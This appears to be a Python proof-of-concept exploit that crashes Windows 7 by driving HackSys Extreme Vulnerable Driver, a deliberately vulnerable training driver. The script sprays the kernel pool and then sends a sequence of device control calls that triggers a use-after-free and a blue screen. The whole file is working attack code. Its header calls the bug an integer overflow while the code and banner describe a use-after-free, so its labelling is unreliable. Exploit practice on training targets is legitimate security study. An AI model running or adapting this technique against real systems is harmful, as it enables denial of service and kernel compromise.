# HackSys Extreme Vulnerable Driver
# integer overflow Blue Screen of Death
# Target: Windows 7 SP1 32-bit
# Author: raycp
# Date: 2018-10-06

from ctypes import *
from ctypes.wintypes import *
import sys, struct, time

# Define constants
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

# Define WinAPI shorthand
CreateProcess = windll.kernel32.CreateProcessW # <-- Unicode version!
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateFile = windll.kernel32.CreateFileW # <-- Unicode version!
DeviceIoControl = windll.kernel32.DeviceIoControl
NtAllocateReserveObject=windll.ntdll.NtAllocateReserveObject
CloseHandle=windll.kernel32.CloseHandle


def gethandle():
    """Open handle to driver and return it"""

    print "[*]Getting device handle..."
    lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,
                         dwDesiredAccess,
                         dwShareMode,
                         lpSecurityAttributes,
                         dwCreationDisposition,
                         dwFlagsAndAttributes,
                         hTemplateFile)
                         
    if not handle or handle == -1:
        print "\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)
        
    print "\t[+]Got device handle: 0x%x" % handle
    return handle



def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def heap_spray():
    spray1 = []
    spray2 = []
    for i in range(0,0x10000):
        spray1.append(NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))

    for i in range(0,0x5000):
        spray2.append(NtAllocateReserveObject(byref(HANDLE(0)), 0, 1))

    for i in range(0,0x5000,2):
        CloseHandle(spray2[i])
def alloc(hDevice,dwIoControlCode):
    """alloc USEAFTERFREE struct"""

    evilbuf = create_string_buffer("A"*0x58)
    lpInBuffer = addressof(evilbuf)
    nInBufferSize = 0xffffffff
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    pwnd = DeviceIoControl(hDevice,
                                           dwIoControlCode,
                                           lpInBuffer,
                                           nInBufferSize,
                                           lpOutBuffer,
                                           nOutBufferSize,
                                           lpBytesReturned,
                                           lpOverlapped)


def delete(hDevice,dwIoControlCode):
    """delete USEAFTERFREE struct"""

    evilbuf = create_string_buffer("A"*0x58)
    lpInBuffer = addressof(evilbuf)
    nInBufferSize = 0xffffffff
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    pwnd = DeviceIoControl(hDevice,
                                           dwIoControlCode,
                                           lpInBuffer,
                                           nInBufferSize,
                                           lpOutBuffer,
                                           nOutBufferSize,
                                           lpBytesReturned,
                                           lpOverlapped)
def alloc_fake(hDevice,dwIoControlCode):
    evilbuf = create_string_buffer("A"*0x58)
    lpInBuffer = addressof(evilbuf)
    nInBufferSize = 0xffffffff
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    pwnd = DeviceIoControl(hDevice,
                                           dwIoControlCode,
                                           lpInBuffer,
                                           nInBufferSize,
                                           lpOutBuffer,
                                           nOutBufferSize,
                                           lpBytesReturned,
                                           lpOverlapped)
def use(hDevice,dwIoControlCode):
    evilbuf = create_string_buffer("A"*0x58)
    lpInBuffer = addressof(evilbuf)
    nInBufferSize = 0xffffffff
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None

    pwnd = DeviceIoControl(hDevice,
                                           dwIoControlCode,
                                           lpInBuffer,
                                           nInBufferSize,
                                           lpOutBuffer,
                                           nOutBufferSize,
                                           lpBytesReturned,
                                           lpOverlapped)


def trigger(hDevice):
    """trigger the bsod"""
    heap_spray()
    alloc(hDevice,ctl_code(0x804))
    delete(hDevice,ctl_code(0x806))
    alloc_fake(hDevice,ctl_code(0x807))
    use(hDevice,ctl_code(0x805))
    
if __name__ == "__main__":
    print "\n**HackSys Extreme Vulnerable Driver**"
    print "**UAF BSOD**\n"

    trigger(gethandle())

